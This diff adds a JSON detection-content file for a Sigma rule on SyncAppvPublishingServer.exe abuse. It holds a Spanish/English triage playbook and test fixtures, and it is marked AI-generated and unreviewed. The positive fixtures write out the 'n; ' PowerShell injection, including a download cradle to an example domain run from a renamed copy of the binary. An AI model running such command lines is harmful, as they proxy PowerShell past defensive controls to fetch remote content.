@@ -1,0 +1,137 @@
+{
+  "rule": {
+    "id": "fbd7c32d-db2a-4418-b92c-566eb8911133",
+    "title": "SyncAppvPublishingServer Execute Arbitrary PowerShell Code",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó SyncAppvPublishingServer.exe con una línea de comandos que contiene la secuencia \"n; \", el patrón conocido para inyectar código PowerShell arbitrario a través de este binario firmado de App-V.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\SyncAppvPublishingServer.exe u OriginalFileName es syncappvpublishingserver.exe, y CommandLine contiene \"n; \". El binario arma un comando de PowerShell con sus argumentos, así que lo que sigue a \"n;\" se ejecuta como sentencias PowerShell adicionales.",
+      "why_it_matters": "Es una técnica de ejecución de proxy mediante binarios firmados (ATT&CK T1218). Permite correr PowerShell sin lanzar powershell.exe, lo que puede evadir controles y reglas centrados en ese ejecutable y en el registro de líneas de comandos.",
+      "triage_steps": [
+        "Lea el CommandLine completo y extraiga el código posterior a \"n; \": busque descargas (IWR, Net.WebClient), Start-Process, cadenas codificadas o rutas en %TEMP%.",
+        "Revise ParentImage y su línea de comandos: wscript.exe con SyncAppvPublishingServer.vbs, cmd.exe, Office o navegadores son más sospechosos que un componente de App-V.",
+        "Confirme si el host tiene el cliente App-V habilitado y si hay paquetes App-V desplegados; si no los hay, el uso legítimo es poco probable.",
+        "Identifique al usuario del evento y valide si su actividad es habitual; busque otras alertas del mismo usuario en los últimos 7 días.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos, conexiones de red salientes, archivos creados y cambios en claves Run o tareas programadas.",
+        "Revise los logs de PowerShell (Script Block Logging, evento 4104) del host en esa ventana para recuperar el script ejecutado.",
+        "Busque en el resto del entorno la misma CommandLine o el mismo dominio o IP contactada para medir el alcance."
+      ],
+      "false_positives": [
+        "Clientes App-V que sincronizan con el servidor de publicación mediante SyncAppvPublishingServer.vbs o tareas propias del agente.",
+        "Pruebas autorizadas de red team o ejecuciones de Atomic Red Team para T1218.",
+        "Scripts administrativos de soporte de App-V documentados por el equipo de escritorio."
+      ],
+      "response_steps": [
+        "Verifique con el dueño del equipo o el equipo de App-V si la ejecución estaba prevista antes de actuar.",
+        "Si el código es malicioso, aísle el endpoint desde el EDR y preserve memoria, logs de PowerShell y archivos referenciados.",
+        "Bloquee en el proxy o firewall los dominios e IP usados y elimine la persistencia identificada tras confirmarla.",
+        "Restablezca credenciales del usuario afectado si hubo descarga de herramientas o acceso a secretos.",
+        "Considere restringir SyncAppvPublishingServer.exe con WDAC o AppLocker en equipos sin App-V."
+      ],
+      "severity_rationale": "Nivel medio: el patrón \"n; \" indica fuertemente abuso, pero existen clientes App-V legítimos y se requiere revisar el código antes de escalar."
+    },
+    "en": {
+      "summary": "SyncAppvPublishingServer.exe ran with a command line containing \"n; \", the known pattern for injecting arbitrary PowerShell code through this signed App-V binary.",
+      "what_it_detects": "Windows process creation events where Image ends with \\SyncAppvPublishingServer.exe or OriginalFileName is syncappvpublishingserver.exe, and CommandLine contains \"n; \". The binary builds a PowerShell command from its arguments, so text after \"n;\" runs as extra PowerShell statements.",
+      "why_it_matters": "This is signed binary proxy execution (ATT&CK T1218). It runs PowerShell without starting powershell.exe, which can bypass controls and detections focused on that executable.",
+      "triage_steps": [
+        "Read the full CommandLine and extract the code after \"n; \": look for downloads (IWR, Net.WebClient), Start-Process, encoded strings or %TEMP% paths.",
+        "Check ParentImage and its command line: wscript.exe running SyncAppvPublishingServer.vbs, cmd.exe, Office or browsers are more suspicious than an App-V component.",
+        "Confirm whether the host has the App-V client enabled and packages deployed; without them, legitimate use is unlikely.",
+        "Identify the user and validate whether the activity fits their role; search for other alerts on the same user in the last 7 days.",
+        "Pivot on the same host +/- 15 minutes: child processes, outbound connections, created files, Run keys and scheduled tasks.",
+        "Review PowerShell Script Block Logging (event 4104) on the host for that window to recover the executed script.",
+        "Hunt for the same CommandLine, domain or IP across the environment to scope the activity."
+      ],
+      "false_positives": [
+        "App-V clients syncing with the publishing server via SyncAppvPublishingServer.vbs or agent tasks.",
+        "Authorized red team tests or Atomic Red Team runs for T1218.",
+        "Documented App-V support scripts used by the desktop team."
+      ],
+      "response_steps": [
+        "Verify with the host owner or App-V team whether the execution was expected before acting.",
+        "If the code is malicious, isolate the endpoint via EDR and preserve memory, PowerShell logs and referenced files.",
+        "Block contacted domains and IPs at the proxy or firewall and remove confirmed persistence.",
+        "Reset the affected user's credentials if tools were downloaded or secrets accessed.",
+        "Consider restricting SyncAppvPublishingServer.exe with WDAC or AppLocker on hosts without App-V."
+      ],
+      "severity_rationale": "Medium: the \"n; \" pattern strongly suggests abuse, but legitimate App-V clients exist and the code must be reviewed before escalating."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "SyncAppvPublishingServer.exe launched from cmd.exe with injected PowerShell that starts a process",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\SyncAppvPublishingServer.exe",
+          "OriginalFileName": "syncappvpublishingserver.exe",
+          "CommandLine": "SyncAppvPublishingServer.exe \"n; Start-Process notepad.exe\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c SyncAppvPublishingServer.exe \"n; Start-Process notepad.exe\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Renamed copy detected via OriginalFileName, injecting a download cradle to an example domain",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\sync.exe",
+          "OriginalFileName": "syncappvpublishingserver.exe",
+          "CommandLine": "sync.exe \"n; IWR http://updates.example.com/a.txt -OutFile $env:TEMP\\a.txt\"",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "SyncAppvPublishingServer.exe run without the \"n; \" injection sequence",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\SyncAppvPublishingServer.exe",
+          "OriginalFileName": "syncappvpublishingserver.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\SyncAppvPublishingServer.exe\" 1",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "IntegrityLevel": "System"
+        }
+      },
+      {
+        "description": "powershell.exe whose command line contains \"n; \" but the image is not SyncAppvPublishingServer",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -Command \"Write-Output \"n; done\"\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
